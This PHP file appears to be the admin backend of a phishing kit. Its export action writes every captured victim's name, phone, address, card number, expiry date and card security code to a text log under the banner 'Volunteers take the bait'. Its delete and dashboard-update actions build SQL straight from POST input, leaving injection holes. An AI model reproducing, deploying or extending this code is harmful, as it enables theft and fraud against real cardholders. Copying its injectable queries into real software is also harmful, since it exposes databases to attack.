<?php

require_once 'config.php';

$action = $_POST["action"];

if ($action == 'user_delete') {
    $user_id = $_POST["userid"];

    $row = '';
    $sql = "DELETE FROM user_information where id='$user_id'";
    if ($result = mysqli_query($conn, $sql)) {
        $row = $conn->affected_rows;
    }


    if ($row != 0) {
        echo 1;
    } else {
        echo 1;
    }
}

if ($action == 'user_export') {

    $row = '';
    $filename = time() . ".txt";
    $sql = "select * FROM user_information";
    header('Content-Type: text/plain; charset=utf-8');
    if ($result = mysqli_query($conn, $sql)) {
        while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
            $fullname = $row['fullname'];
            $phone = $row['phone'];
            $street = $row['street'];
            $locality = $row['locality'];
            $zipcode = $row['zipcode'];
            $cardnumber = $row['cardnumber'];
            $exp_date = $row['exp_date'];
            $card_code = $row['card_code'];
            $msg = '
                #----------------------[ Volunteers take the bait ]------------------#
                #--------------------------------[ Personal Information ]----------------------------#
                Name: ' . $fullname . '
                Phone: ' . $phone . '
                Street: ' . $street . '
                Locality: ' . $locality . '
                Zipcode: ' . $zipcode . '
                #-------------------------------[ Cardholder details ]---------------------------#
                Cardnumber: ' . $cardnumber . '
                Exp Date: ' . $exp_date . '
                Card Code: ' . $card_code . '
                #--------------------------------[ Fingerprint information ]----------------------------#
                ip: 123.123.123.123';

            $save = fopen($filename, "a+");
            $msg = mb_convert_encoding($msg, 'UTF-8');
            fwrite($save, $msg);
            fclose($save);
        }
    }


    // header('Content-Description: File Transfer');
    // header('Content-Type: application/octet-stream');
    // header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
    // header('Expires: 0');
    // header('Cache-Control: must-revalidate');
    // header('Pragma: public');
    // header('Content-Length: ' . filesize($filename));

    // ob_clean();
    // flush();
    // readfile($filename);
    echo $filename;
    exit;
}

if ($action == 'dashboard_update') {
    $meta_key = $_POST['meta_key'];
    $value = $_POST['value'];
    $row = '';
    $sql = "update dashboard set value= '$value' where meta_key='$meta_key'";

    if ($result = mysqli_query($conn, $sql)) {
        $row = $conn->affected_rows;
    }


    if ($row != 0) {
        echo 1;
    } else {
        echo 1;
    }
}
